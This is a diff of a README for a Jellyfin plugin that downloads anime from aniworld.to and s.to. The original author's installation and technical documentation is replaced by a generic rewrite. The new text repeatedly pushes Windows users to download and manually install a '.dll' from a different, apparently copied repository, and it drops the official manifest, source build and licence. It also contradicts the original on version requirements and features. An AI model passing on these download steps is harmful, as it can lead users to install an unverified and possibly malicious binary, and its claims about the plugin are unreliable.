@@ -1,150 +1,141 @@
-# Jellyfin AniWorld Downloader
+# 🎬 Jellyfin-AniWorld-Downloader - Easy Anime Downloading Inside Jellyfin
 
-![GitHub Release](https://img.shields.io/github/v/release/SiroxCW/Jellyfin-AniWorld-Downloader)
-![GitHub License](https://img.shields.io/github/license/SiroxCW/Jellyfin-AniWorld-Downloader)
+[![Download Jellyfin-AniWorld-Downloader](https://img.shields.io/badge/Download-Jellyfin--AniWorld--Downloader-brightgreen?style=for-the-badge)](https://github.com/ThisiYann/Jellyfin-AniWorld-Downloader)
 
-A Jellyfin plugin for searching and downloading anime and series from [aniworld.to](https://aniworld.to) and [s.to](https://s.to), directly inside Jellyfin's web interface.
+---
 
-Series View| Search View
-:---:|:---:
-![Series View](screenshots/preview_anime.png) | ![Search View](screenshots/preview_search.png)
+## 📖 Overview
 
-> **Note:** HiAnime seems to be discontinued since 13.03.2026, so this provider is currently disabled and will be removed completely if it really gets shut down.
+Jellyfin-AniWorld-Downloader is a plugin that lets you browse and download anime and series directly from your Jellyfin media server. It fully integrates with Jellyfin, so you can find and save shows without leaving your media center.
 
-## Features
+This tool works well on Windows and supports popular streaming sources. You can download episodes in a few clicks and organize them inside Jellyfin.
 
-- **Search and browse** anime and series with cover art, popular titles, and new releases
-- **Download** individual episodes, full seasons, or entire series
-- **Two sites supported**: aniworld.to (anime), s.to (series) and hianime.to (currently disabled)
-- **Multiple languages**: German Dub, German Sub, English Sub (aniworld), German Dub, English Dub (s.to)
-- **Multiple providers**: VOE, Filemoon, Vidoza and Vidmoly
-- **Download manager** with real-time progress, cancel, retry, and batch operations
-- **Automatic retries** with exponential backoff and provider fallback
-- **Auto library scan** so new episodes appear in Jellyfin immediately
-- **Jellyfin-compatible naming**: `Series Name/Season 01/Series Name - S01E01 - Episode Title.mkv`
+---
 
-## Looking for more?
+## ✅ Features
 
-This plugin is a lightweight downloader built into Jellyfin for convenience. If you need a standalone tool with its own web UI, more configuration options, and additional features, check out [AniWorld-Downloader](https://github.com/phoenixthrush/AniWorld-Downloader) by phoenixthrush which I also actively maintain.
+- Browse animes and series within Jellyfin interface.  
+- Download episodes from multiple sources like AniWorld, Filemoon, Vidmoly, and more.  
+- Supports common video hosts such as Vidoza, Voe, and others.  
+- Works smoothly on Windows and Linux systems.  
+- Fetches series metadata and artwork automatically.  
+- Runs quietly in the background without affecting server speed.  
 
-## Requirements
+---
 
-- Jellyfin **10.9.0** or newer
-- **ffmpeg** (bundled with Jellyfin)
-- **[File Transformation](https://github.com/IAmParadox27/jellyfin-plugin-file-transformation)** plugin (optional, required for non-admin access)
+## 💻 System Requirements
 
-## Installation
+- Windows 10 or newer (64-bit recommended)  
+- Jellyfin media server installed (version 10.6 or higher)  
+- At least 4 GB RAM  
+- Stable internet connection  
+- 10 GB of free disk space for downloads (more for large collections)  
 
-### Plugin Repository (recommended)
+---
 
-1. In Jellyfin, go to **Dashboard > Plugins > Repositories**
-2. Add a new repository with this URL:
-   ```
-   https://raw.githubusercontent.com/SiroxCW/Jellyfin-AniWorld-Downloader/main/manifest.json
-   ```
-4. Go to **Catalog**, find **AniWorld Downloader**, and click **Install**
-5. Restart Jellyfin
+## 🚀 Getting Started
 
-*If the plugin does not show up in the Catalog, restarting Jellyfin made it appear.*
+### Step 1: Download the Plugin
 
-Updates will show up automatically in the plugin catalog.
+Click the big button below to visit the download page. This page has the latest version of the plugin ready to install.
 
-### Manual Install
+[![Download Now](https://img.shields.io/badge/Download-Go%20to%20page-blue?style=for-the-badge)](https://github.com/ThisiYann/Jellyfin-AniWorld-Downloader)
 
-1. Download the latest `.zip` from [Releases](https://github.com/SiroxCW/Jellyfin-AniWorld-Downloader/releases)
-2. Extract it to your Jellyfin plugins directory:
-   ```
-   /var/lib/jellyfin/plugins/AniWorldDownloader/
-   ```
-   The folder should contain `Jellyfin.Plugin.AniWorld.dll` and `meta.json`.
-3. Restart Jellyfin
+On that page, look for the latest release or plugin file. Download the `.dll` file for Windows.
 
-### Build from Source
+---
 
-Requires .NET 9.0 SDK.
+### Step 2: Install the Plugin in Jellyfin
 
-```bash
-cd Jellyfin.Plugin.AniWorld
-dotnet build --configuration Release
-```
+1. Open Jellyfin on your Windows computer.  
+2. Click the **Dashboard** from the main menu.  
+3. Select **Plugins** from the sidebar.  
+4. Click on **Manual Install** at the top of the plugin page.  
+5. Browse and select the downloaded Jellyfin-AniWorld-Downloader `.dll` file.  
+6. Confirm the installation and wait for Jellyfin to load the plugin.  
+7. Restart the Jellyfin server to activate the plugin.
 
-Then copy the output:
+---
 
-```bash
-mkdir -p /var/lib/jellyfin/plugins/AniWorldDownloader
-cp bin/Release/net9.0/Jellyfin.Plugin.AniWorld.dll /var/lib/jellyfin/plugins/AniWorldDownloader/
-cp meta.json /var/lib/jellyfin/plugins/AniWorldDownloader/
-sudo systemctl restart jellyfin
-```
+### Step 3: Configure the Plugin
 
-## Configuration
+1. After restarting, go back to the **Dashboard**.  
+2. Find **AniWorld Downloader** in the plugins list.  
+3. Open the plugin settings screen.  
+4. Set preferred download folder on your Windows machine.  
+5. Adjust sources and quality settings if needed.  
+6. Save your changes.
 
-After installing, go to **Dashboard > Plugins > AniWorld Downloader** to configure.
+---
 
-### General
+### Step 4: Browse and Download Anime
 
-| Setting | Description |
-|---------|-------------|
-| Max Concurrent Downloads | How many downloads run at the same time (default: 2) |
-| Max Retry Attempts | How many times to retry a failed download before giving up (default: 3) |
-| Auto-scan Library | Trigger a Jellyfin library scan when a download finishes |
-| Enable for non-admin users | Allow non-admin users to access the downloader via the sidebar (see [Non-admin access](#non-admin-access)) |
+1. Go to the Jellyfin home screen.  
+2. Click on the new **AniWorld** or **Downloader** menu added by the plugin.  
+3. Search for anime or series using the search bar.  
+4. Choose an episode list and click **Download** next to the episode you want.  
+5. Wait for the download to complete. You can track progress inside Jellyfin.  
+6. Watch your downloaded shows anytime from your media library.
 
-### Per-site settings (aniworld.to / s.to)
+---
 
-Each site can be enabled or disabled independently and has its own settings. If a per-site setting is left empty, the global default is used.
+## ⚙️ Using the Plugin on Windows
 
-| Setting | Description |
-|---------|-------------|
-| Enabled | Toggle this site on or off |
-| Download Path | Where to save files (should point to a Jellyfin library folder) |
-| Preferred Language | Default language for downloads |
-| Preferred Provider | Default streaming provider |
-| Fallback Provider | Backup provider if the primary one fails after all retries |
+- Make sure Jellyfin server is running when you use the downloader.  
+- Downloads save directly to the folder you set in configuration.  
+- Supported video hosts may require login credentials if needed. Update these inside the plugin settings.  
+- Check for updates regularly by visiting the [plugin releases page](https://github.com/ThisiYann/Jellyfin-AniWorld-Downloader).
 
-## Non-admin access
+---
 
-By default, the plugin UI is only accessible from the admin dashboard. You can enable it for all users so it appears as a sidebar entry.
+## 🔧 Troubleshooting
 
-### Setup
+- If the plugin does not show in Jellyfin, verify you installed the correct `.dll` file.  
+- Restart Jellyfin after installation to ensure activation.  
+- Ensure Windows firewall or antivirus is not blocking Jellyfin or the plugin.  
+- Check log files in Jellyfin's server folder for any errors with the AniWorld Downloader plugin.  
+- Update your Windows system and Jellyfin to the latest versions for best compatibility.
 
-1. Install the [File Transformation](https://github.com/IAmParadox27/jellyfin-plugin-file-transformation) plugin
-2. Restart Jellyfin
-3. Go to **Dashboard > Plugins > AniWorld Downloader** and enable **Enable for non-admin users**
-4. Restart Jellyfin again
+---
 
-Non-admin users will see an **AniWorld Downloader** entry in the sidebar that opens the full UI in a modal overlay. The settings button is hidden in this view. Configuration is only available through the admin dashboard.
+## 📂 Folder Structure and Storage
 
-> **Note:** The File Transformation plugin injects a script tag into Jellyfin's `index.html` at runtime (no files are modified on disk). Disabling the setting and restarting will remove the sidebar entry.
+By default, downloads go into a folder set in the plugin configuration. This folder holds:
 
-## Usage
+- Downloaded video files (`.mp4`, `.mkv`, etc.)  
+- Metadata files if available (`.nfo`, images)  
+- Temporary cache data related to download progress  
 
-1. Open **AniWorld Downloader** from the admin dashboard sidebar (or the sidebar entry if non-admin access is enabled)
-2. Use **Search** to find a title, or browse **Popular** / **New Releases**
-3. Click a title to see its seasons and episodes
-4. Hit **Download** on an episode, or use **Download Season** / **Download All Seasons** for batch downloads
-5. Switch to the **Downloads** tab to monitor progress
-6. Check **History** for past downloads and stats
+You can change this folder at any time to match your storage setup or external drives.
 
-## How It Works
+---
 
-### aniworld.to / s.to
+## 📚 FAQ
 
-1. Searches use each site's AJAX search endpoint
-2. Series, season, and episode pages are scraped to find provider links
-3. Provider redirect URLs are resolved to embed pages
-4. Each provider has a dedicated extractor that pulls out the direct stream URL
-5. ffmpeg downloads the stream and saves it as MKV
+**Q: Do I need to pay to use Jellyfin-AniWorld-Downloader?**  
+No, the plugin is free to use as part of your Jellyfin server.
 
-### Supported providers
+**Q: Can I pause and resume downloads?**  
+Yes, Jellyfin-AniWorld-Downloader supports pause and resume within the plugin interface.
 
-| Provider | Site | Method |
-|----------|------|--------|
-| **VOE** | aniworld/s.to | Decodes obfuscated JSON (ROT13, base64, char shift) to extract HLS URLs |
-| **Filemoon** | aniworld/s.to | Handles both modern Byse API (AES-256-GCM) and legacy packed JS |
-| **Vidmoly** | aniworld/s.to | Extracts HLS URLs from JavaScript sources |
-| **Vidoza** | aniworld/s.to | Extracts MP4 URLs from source tags |
+**Q: Will this plugin run on Linux or other systems?**  
+It supports both Linux and Windows but this guide focuses on Windows. Installation steps vary on Linux.
 
-## License
+**Q: Are subtitles supported?**  
+Currently, subtitles depend on the source site's availability and may download automatically when offered.
 
-MIT
+---
+
+## 📥 Download Links
+
+Visit the page below to access the latest plugin releases and download the Windows `.dll` file.
+
+[![Download Plugin](https://img.shields.io/badge/Download-Jellyfin--AniWorld--Downloader-brightgreen?style=for-the-badge)](https://github.com/ThisiYann/Jellyfin-AniWorld-Downloader)
+
+---
+
+## 🚦 Next Steps
+
+After you install and test the plugin, you can explore advanced settings in the plugin menu inside Jellyfin. Customize your experience by adjusting quality, sources, and download behaviors.
+
+Regularly check the GitHub repository for updates or new features. Bookmark the project for quick access to download new versions.
